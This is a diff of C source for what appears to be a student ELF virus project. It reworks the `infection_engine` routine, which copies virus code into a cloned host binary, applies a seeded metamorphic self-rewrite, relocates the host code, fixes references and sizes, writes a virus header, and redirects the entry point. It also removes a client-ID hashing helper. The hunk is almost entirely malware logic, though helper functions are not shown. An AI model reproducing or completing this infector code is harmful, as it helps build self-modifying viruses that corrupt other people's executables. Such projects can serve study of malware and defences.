@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/11 15:42:04 by agrumbac          #+#    #+#             */
-/*   Updated: 2020/07/19 18:55:23 by ichkamo          ###   ########.fr       */
+/*   Updated: 2020/12/01 21:25:05 by ichkamo          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -96,34 +96,25 @@ static bool	define_shift_amount(const struct entry *original_entry, size_t *shif
 	return true;
 }
 
-bool		get_client_id(uint64_t *client_id, struct safe_ptr ref)
-{
-	Elf64_Ehdr	*elf_hdr = safe(ref, 0, sizeof(Elf64_Ehdr));
-	if (elf_hdr == NULL)
-		return errors(ERR_FILE, _ERR_CANT_READ_ELFHDR);
-	*client_id = hash((void *)elf_hdr, sizeof(Elf64_Ehdr));
-	return true;
-}
-
 bool		infection_engine(struct safe_ptr clone_ref, struct safe_ptr original_ref)
 {
 	struct entry	original_entry;
 	struct entry	clone_entry;
 	size_t		shift_amount;
-	uint64_t	son_seed[2];
-	uint64_t	client_id;
+	uint64_t	seed;
+	// size_t		virus_size; // TODO!!
 
 	if (!find_entry(&mut original_entry, original_ref)
 	|| !not_infected(&original_entry, original_ref)
-	|| !define_shift_amount(&mut original_entry, &mut shift_amount)
-	|| !get_client_id(&mut client_id, original_ref)
-	|| !copy_client_to_clone(clone_ref, original_ref, original_entry.end_of_last_section, shift_amount, original_ref.size)
 	|| !copy_virus_to_clone(clone_ref, &original_entry)
-	|| !metamorph_self(clone_ref, original_entry.end_of_last_section, son_seed, client_id)
-	|| !adjust_references(clone_ref , shift_amount, original_entry.end_of_last_section)
+	|| !generate_seed(&mut seed, clone_ref, original_entry.end_of_last_section)
+	|| !metamorph_self(clone_ref, original_entry.end_of_last_section, seed)//TODO virus_size
+	|| !define_shift_amount(&original_entry, &mut shift_amount)// TODO virus_size
+	|| !copy_client_to_clone(clone_ref, original_ref, original_entry.end_of_last_section, shift_amount, original_ref.size)
+	|| !adjust_references(clone_ref, shift_amount, original_entry.end_of_last_section)
 	|| !find_entry(&mut clone_entry, clone_ref)
 	|| !adjust_sizes(&mut clone_entry, shift_amount)
-	|| !setup_virus_header(clone_ref, original_entry.end_of_last_section, son_seed)
+	|| !setup_virus_header(clone_ref, original_entry.end_of_last_section, seed)
 	|| !change_entry(clone_ref, &original_entry))
 		return errors(ERR_THROW, _ERR_INFECTION_ENGINE);
 
